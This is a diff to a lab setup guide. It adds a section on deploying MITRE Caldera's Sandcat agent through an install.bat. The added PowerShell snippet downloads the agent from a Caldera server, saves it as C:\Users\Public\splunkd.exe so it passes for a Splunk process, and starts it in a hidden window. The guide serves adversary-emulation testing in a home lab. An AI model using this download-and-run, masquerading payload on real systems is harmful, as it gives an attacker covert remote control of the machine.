@@ -281,6 +281,25 @@ http://192.168.1.37:8888
 
 - install.bat
 
+### Caldera Sandcat
+
+- Take note of the way I am running I am running the Sandcat installer via the install.bat, you can update if you wish.
+
+```
+
+$server="http://caldera-server.my-net2:8888";
+$url="$server/file/download";
+$wc=New-Object System.Net.WebClient;
+$wc.Headers.add("platform","windows");
+$wc.Headers.add("file","sandcat.go");
+$data=$wc.DownloadData($url);
+get-process | ? {$_.modules.filename -like "C:\Users\Public\splunkd.exe"} | stop-process -f;
+rm -force "C:\Users\Public\splunkd.exe" -ea ignore;
+[io.file]::WriteAllBytes("C:\Users\Public\splunkd.exe",$data) | Out-Null;
+Start-Process -FilePath C:\Users\Public\splunkd.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+
+```
+
 ## Setup Windows 11 as a container
 
 ```
